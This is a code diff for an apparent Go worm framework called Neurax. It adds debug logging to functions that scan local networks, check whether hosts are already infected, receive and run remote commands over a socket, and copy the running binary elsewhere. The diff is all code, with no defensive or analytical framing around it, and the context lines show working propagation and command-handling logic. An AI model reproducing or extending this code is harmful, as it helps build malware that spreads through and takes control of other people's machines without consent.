@@ -124,6 +124,7 @@ type __NeuraxConfig struct {
 	AllocNum                 int
 	Blacklist                []string
 	FastHTTP                 bool
+	Debug                    bool
 }
 
 var NeuraxConfig = __NeuraxConfig{
@@ -171,6 +172,7 @@ var NeuraxConfig = __NeuraxConfig{
 	AllocNum:                 5,
 	Blacklist:                []string{},
 	FastHTTP:                 false,
+	Debug:                    false,
 }
 
 //Verbose error printing
@@ -285,6 +287,7 @@ func IsHostActive(target string) bool {
 			port_str := strconv.Itoa(port)
 			err, _ := net.DialTimeout("tcp", target+port_str, timeout)
 			if err == nil {
+				NeuraxDebug("Found active host: " + target)
 				return true
 			}
 		}
@@ -304,9 +307,11 @@ func IsHostActive(target string) bool {
 		opened_ports := ps.GetOpenedPort(first, last)
 		if len(opened_ports) != 0 {
 			if NeuraxConfig.ScanRequiredPort == 0 {
+				NeuraxDebug("Found active host: " + target)
 				return true
 			} else {
 				if PortscanSingle(target, NeuraxConfig.ScanRequiredPort) {
+					NeuraxDebug("Found active host: " + target)
 					return true
 				}
 			}
@@ -337,6 +342,7 @@ func IsHostInfected(target string) bool {
 		if resp.StatusCode() == fasthttp.StatusOK {
 			InfectedHosts = append(InfectedHosts, target)
 			InfectedHosts = RemoveFromSlice(InfectedHosts, GetLocalIp())
+			NeuraxDebug("Found infected host: " + target)
 			return true
 		}
 	} else {
@@ -347,6 +353,7 @@ func IsHostInfected(target string) bool {
 		if rsp.StatusCode == 200 {
 			InfectedHosts = append(InfectedHosts, target)
 			InfectedHosts = RemoveFromSlice(InfectedHosts, GetLocalIp())
+			NeuraxDebug("Found infected host: " + target)
 			return true
 		}
 		return false
@@ -463,6 +470,7 @@ func NeuraxOpenComm() {
 		buff := make([]byte, 1024)
 		len, _ := conn.Read(buff)
 		cmd := string(buff[:len-1])
+		NeuraxDebug("Received command: " + cmd)
 		go handle_command(cmd)
 		conn.Close()
 	}
@@ -531,7 +539,9 @@ func neurax_scan_passive(f func(string)) {
 func neurax_scan_active(f func(string)) {
 	targets := []string{}
 	if NeuraxConfig.ScanGatewayFirst {
-		targets = append(targets, GetGatewayIP())
+		gateway := GetGatewayIP()
+		targets = append(targets, gateway)
+		NeuraxDebug("Added gateway to targets pool: " + gateway)
 	}
 	if NeuraxConfig.ScanArpCache {
 		for ip, _ := range arp.Table() {
@@ -539,6 +549,7 @@ func neurax_scan_active(f func(string)) {
 				targets = append(targets, ip)
 			}
 		}
+		NeuraxDebug(F("Found %d targets in ARP cache", len(arp.Table())))
 	}
 	full_addr_range, _ := ExpandCidr(NeuraxConfig.Cidr)
 	for _, addr := range full_addr_range {
@@ -554,9 +565,9 @@ func neurax_scan_active(f func(string)) {
 		targets = NeuraxConfig.ScanOnly
 	}
 	for _, target := range targets {
-		fmt.Println("Scanning ", target)
+		NeuraxDebug("Scanning " + target)
 		if IsHostActive(target) && !IsHostInfected(target) {
-			fmt.Println("Scanned ", target)
+			NeuraxDebug("Scanned " + target)
 			go f(target)
 		}
 	}
@@ -575,6 +586,12 @@ func NeuraxScan(f func(string)) {
 	for {
 		neurax_scan_core(f)
 		time.Sleep(time.Duration(IntervalToSeconds(NeuraxConfig.ScanInterval)))
+	}
+}
+
+func NeuraxDebug(msg string) {
+	if NeuraxConfig.Debug {
+		PrintInfo(msg)
 	}
 }
 
@@ -836,6 +853,7 @@ func NeuraxMigrate(path string) error {
 	if strings.Contains(current_path, path) {
 		return nil
 	}
+	NeuraxDebug("Migrating -> " + path)
 	return CopyFile(os.Args[0], path)
 }
 
